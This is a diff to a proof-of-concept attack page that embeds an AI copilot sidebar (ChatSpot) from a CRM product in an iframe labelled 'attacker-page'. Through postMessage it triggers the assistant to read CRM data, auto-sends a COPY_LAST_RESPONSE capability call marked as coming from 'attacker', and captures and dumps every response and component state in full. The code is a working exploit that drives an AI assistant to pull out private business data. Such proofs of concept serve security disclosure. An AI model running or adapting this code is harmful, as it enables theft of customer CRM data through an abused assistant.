@@ -55,6 +55,7 @@
     <button onclick="sendSync()">RE-SEND SYNC</button>
     <button onclick="resetPoc()">RESET</button>
     <button onclick="clearLog()">CLR LOG</button>
+    <button onclick="dumpAll()">DUMP ALL JSON</button>
   </div>
 </div>
 
@@ -114,7 +115,7 @@ function loadChatspot(copilotActionEncoded) {
     + `&hostAppName=attacker-page`
     + `&copilotThreadId=exfil-${Date.now()}`;
 
-  log(`Building iframe: ${src.substring(0, 140)}...`, 'status');
+  log(`Building iframe: ${src}...`, 'status');
   setStatus('LOADING');
 
   iframeEl = document.createElement('iframe');
@@ -154,7 +155,7 @@ function sendSync() {
       embeddedProps: {}
     }
   };
-  log('→ Sending SYNC: ' + JSON.stringify(syncMsg).substring(0, 120) + '...', 'status');
+  log('→ Sending SYNC: ' + JSON.stringify(syncMsg), 'status');
   iframeEl.contentWindow.postMessage(syncMsg, '*');
 }
 
@@ -170,7 +171,7 @@ function sendHsIfrMessage(payloadType, extra = {}) {
     v:      1,
     payload: Object.assign({ type: payloadType }, extra)
   };
-  log('→ Sending ' + payloadType + ': ' + JSON.stringify(extra).substring(0, 80), 'write');
+  log('→ Sending ' + payloadType + ': ' + JSON.stringify(extra), 'write');
   iframeEl.contentWindow.postMessage(msg, '*');
 }
 
@@ -231,6 +232,15 @@ function resetPoc(doLog = true) {
   if (doLog) log('--- RESET ---', 'status');
 }
 
+// ── Dump all captured responses to a new window ──────────────────────────
+function dumpAll() {
+  const win = window.open('', '_blank');
+  win.document.write('<pre style="background:#111;color:#0f0;padding:20px;font-size:12px;">'
+    + JSON.stringify(capturedResponses, null, 2)
+      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    + '</pre>');
+}
+
 // ── Main message listener ──────────────────────────────────────────────────
 window.addEventListener('message', e => {
   if (!e.data) return;
@@ -239,7 +249,7 @@ window.addEventListener('message', e => {
   if (e.data.format !== HS_IFR) {
     const raw = JSON.stringify(e.data);
     if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
-      log(`← NON-IFR msg from ${e.origin}: ${raw.substring(0, 150)}`, 'data');
+      log(`← NON-IFR msg from ${e.origin}: ${raw}`, 'data');
     }
     return;
   }
@@ -271,26 +281,60 @@ window.addEventListener('message', e => {
   if (msgType === 'READY') {
     log('Widget READY — sending SET_COMPONENT_STATE...', 'trusted');
     sendSetComponentState();
+    // Probe for component state after AI has had time to respond
+    setTimeout(() => {
+      log('→ Probing GET_COMPONENT_STATE...', 'write');
+      sendHsIfrMessage('GET_COMPONENT_STATE', {
+        target: 'nav-components:chatspot-sidebar'
+      });
+    }, 6000);
+  }
+
+  // ── COMPONENT_STATE_CHANGED: may contain AI response text ──
+  if (msgType === 'COMPONENT_STATE_CHANGED') {
+    log('*** COMPONENT_STATE_CHANGED — possible AI response data ***', 'trusted');
+    log('  FULL STATE: ' + JSON.stringify(payload, null, 2), 'data');
+    capturedResponses.push({ ts: Date.now(), origin: e.origin, type: 'STATE_CHANGED', data: payload });
+  }
+
+  // ── GET_COMPONENT_STATE response ──
+  if (msgType === 'COMPONENT_STATE') {
+    log('*** COMPONENT_STATE response received ***', 'trusted');
+    log('  FULL STATE: ' + JSON.stringify(payload, null, 2), 'data');
+    capturedResponses.push({ ts: Date.now(), origin: e.origin, type: 'COMPONENT_STATE', data: payload });
   }
 
   // ── INVOKE_CAPABILITY: track capability calls ──
   if (msgType === 'INVOKE_CAPABILITY') {
     log(`  CAP triggered: ${payload.name}`, 'trusted');
+    log(`  CAP args: ${JSON.stringify(payload.args)}`, 'data');
 
     // Confirm AI pipeline fired
     if (payload.name === 'UPDATE_QUERY_PARAM_CAP'
         && payload.args?.key === 'copilotAction'
         && payload.args?.value === '') {
       log('  AI FIRED — AI pipeline triggered, CRM data being read', 'trusted');
+      // Schedule COPY_LAST_RESPONSE 8s after AI fires to give it time to finish
+      setTimeout(() => {
+        log('→ Auto-sending COPY_LAST_RESPONSE (8s after AI fired)...', 'write');
+        sendHsIfrMessage('INVOKE_CAPABILITY', {
+          name:   'COPY_LAST_RESPONSE',
+          source: 'attacker',
+          args:   {}
+        });
+      }, 8000);
+    }
+
+    // Log UPDATE_QUERY_PARAM_CAP args fully — may contain encoded CRM data
+    if (payload.name === 'UPDATE_QUERY_PARAM_CAP') {
+      log(`  PARAM key=${payload.args?.key} value=${payload.args?.value}`, 'data');
     }
   }
 
-  // Log any substantial data payloads
+  // Log ALL payloads in full — no truncation
   const raw = JSON.stringify(e.data, null, 2);
-  if (raw.length > 100) {
-    capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
-    log(`  DATA (${raw.length} bytes): ${raw.substring(0, 250)}...`, 'data');
-  }
+  capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
+  log(`  FULL PAYLOAD (${raw.length} bytes):\n${raw}`, 'data');
 });
 
 // Auto-launch on load
